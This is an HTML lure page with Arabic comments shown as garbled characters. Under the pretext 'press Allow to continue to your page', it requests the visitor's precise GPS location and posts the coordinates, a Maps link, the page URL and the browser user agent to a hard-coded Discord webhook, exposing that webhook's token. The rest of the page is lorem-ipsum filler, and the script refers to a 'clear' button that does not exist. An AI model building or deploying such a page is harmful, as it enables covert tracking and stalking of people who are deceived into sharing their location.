<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta property="og:image" content="https://cdn.discordapp.com/attachments/665665123033022486/1410277944135385108/IMG_6807.jpg?ex=68b06f2f&is=68af1daf&hm=451594ed6a59fad756cdbef0ecf6e50012e2974e05e7134fad12b9ce8ee8ff58&">
  <title>Pageset</title>
  <style>
    :root { font-family: system-ui, sans-serif; }
    body { display:flex; min-height:100dvh; align-items:center; justify-content:center; padding:24px; background:#f6f7f9; direction: rtl; }
    .card { max-width:600px; width:100%; background:#fff; border-radius:14px; padding:24px; box-shadow:0 6px 24px rgba(0,0,0,.08); }
    h1 { margin:0 0 8px; font-size:1.25rem; }
    p { margin:0 0 16px; color:#444; }
    small { color:#666; }
    button { padding:12px 16px; border-radius:10px; border:0; cursor:pointer; font-weight:600; }
    .cta { background:#1a73e8; color:#fff; }
    .secondary { background:#eef2f7; }
    .row { display:flex; gap:12px; margin-top:8px; }
    pre { background:#0f172a; color:#e2e8f0; padding:12px; border-radius:10px; overflow:auto; }
    .ok { color:#0b7; font-weight:600; }
    .err { color:#c00; font-weight:600; }
    .muted { color:#777; font-size:0.9em; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Pagesea</h1>
    <p>
        Please press <strong>Allow</strong> to continue to your page
    </p>

    <div class="row">
      <button  class="cta" id="get">Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©</button>
    </div>

    <div id="status" style="margin-top:12px;"></div>
    <pre id="out" hidden></pre>

    <p class="muted">
        Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap    </p>
  </div>

  <script>
    // ======= Ø¹Ø¯Ù‘Ù„ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØºÙŠÙ‘Ø± Ø¨Ù‚ÙŠÙ…Ø© Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ =======
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1410318571027824692/d0lxRDS6o_Z15aocaCmnIuvP8-66OA7JmX1VHVKKLAEJ50Xqbub5L4lVSx5uNIkKkIxk';
    // ==========================================================

    const getBtn   = document.getElementById('get');
    const clearBtn = document.getElementById('clear');
    const statusEl = document.getElementById('status');
    const outEl    = document.getElementById('out');

    function setStatus(msg, cls='') {
      statusEl.className = cls;
      statusEl.textContent = msg;
    }

    function showData(data) {
      outEl.hidden = false;
      outEl.textContent = JSON.stringify(data, null, 2);
    }

    function buildDiscordPayload(data) {
      // Ù†Ø­Ø¶Ù‘Ø± Ø­Ù…ÙˆÙ„Ø© Ù…ØªÙˆØ§ÙÙ‚Ø© Ù…Ø¹ ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
      const { latitude, longitude, accuracy, timestamp, maps_link } = data;
      const ua  = navigator.userAgent;
      const url = location.href;

      return {
        username: "Location Bot",
        content: "ðŸ“ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯ Ø¨Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…",
        embeds: [
          {
            title: "ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹",
            description: "Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙ… Ù…Ø¨Ø§Ø´Ø±Ø©Ù‹ Ù…Ù† Ø§Ù„Ù…ØªØµÙØ­ Ø¨Ø¹Ø¯ Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù….",
            fields: [
              { name: "Latitude",  value: String(latitude), inline: true },
              { name: "Longitude", value: String(longitude), inline: true },
              { name: "Accuracy",  value: `~${Math.round(accuracy)}m`, inline: true },
              { name: "Timestamp", value: timestamp, inline: false },
              { name: "Maps",      value: maps_link, inline: false },
              { name: "Page",      value: url, inline: false },
              { name: "User-Agent",value: ua.slice(0, 200), inline: false }
            ]
          }
        ]
      };
    }

    async function sendDirectToDiscord(payload) {
      // Ù…Ù„Ø§Ø­Ø¸Ø©: Ù‚Ø¯ ÙŠØ±ÙØ¶ Ø§Ù„Ù…ØªØµÙØ­ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ø³Ø¨Ø¨ CORS Ù„Ø£Ù† Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù„Ø§ ÙŠØ±Ø³Ù„ Ø±Ø¤ÙˆØ³ CORS Ø§Ù„Ù…Ù†Ø§Ø³Ø¨Ø©
      const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        // keepalive Ù…ÙÙŠØ¯ ÙÙŠ Ø­Ø§Ù„Ø© Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø© Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ Ù„ÙƒÙ† Ù„ÙŠØ³ Ù…Ø¶Ù…ÙˆÙ†Ø§Ù‹ Ø¯Ø§Ø¦Ù…Ø§Ù‹
        keepalive: true
      });

      if (!res.ok) {
        const text = await res.text().catch(() => '');
        throw new Error(`Discord HTTP ${res.status} ${text ? '- ' + text : ''}`.trim());
      }
      return res;
    }

    function isLikelyCORSError(e) {
      // ÙƒØ«ÙŠØ± Ù…Ù† Ø£Ø®Ø·Ø§Ø¡ CORS ØªØ¸Ù‡Ø± ÙƒÙ€ "TypeError: Failed to fetch"
      return e instanceof TypeError && /fetch/i.test(String(e));
    }

    getBtn.addEventListener('click', () => {
      if (!('geolocation' in navigator)) {
        setStatus('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ù† Ù…ØªØµÙØ­ Ø§Ø®Ø±.', 'err');
        return;
      }

      setStatus('Ø·Ù„Ø¨ Ø¥Ø°Ù† ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹â€¦');

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          const link = `https://maps.google.com/?q=${latitude},${longitude}`;

          const data = {
            latitude,
            longitude,
            accuracy,
            timestamp: new Date(pos.timestamp).toISOString(),
            maps_link: link,
            note: 'Ù„Ø§ ÙŠØªÙ… ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø©. .'
          };

          // Ù†Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø´ÙØ§ÙÙŠØ©
          showData(data);
          setStatus(`ØªÙ… Ø¬Ù„Ø¨ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª âœ“ (~${Math.round(accuracy)}Ù… Ø¯Ù‚Ø©). Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ â€¦`);

          try {
            await sendDirectToDiscord(buildDiscordPayload(data));
            setStatus('ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­ âœ“', 'ok');
          } catch (e) {
            console.error(e);
            if (isLikelyCORSError(e)) {
              setStatus('ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ÙŠØ¨Ø¯Ùˆ Ø£Ù†Ù‡ ØªÙ… Ø­Ø¸Ø± Ø§Ù„Ø·Ù„Ø¨ Ø¨Ø³Ø¨Ø¨ CORS. ÙŠÙÙ†ØµØ­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Proxy.', 'err');
            } else {
              setStatus(`ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯: ${e.message}`, 'err');
            }
          }
        },
        err => {
          // Ø£Ø®Ø·Ø§Ø¡ Ø´Ø§Ø¦Ø¹Ø©: Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù† / Ù†ÙØ§Ø¯ Ø§Ù„ÙˆÙ‚Øª / Ù„Ø§ ÙŠÙˆØ¬Ø¯ GPS
          setStatus(`Ø®Ø·Ø£: ${err.message}`, 'err');
          outEl.hidden = true;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });

    clearBtn.addEventListener('click', () => {
      setStatus('');
      outEl.hidden = true;
      outEl.textContent = '';
    });
  </script>
</body>
</html>


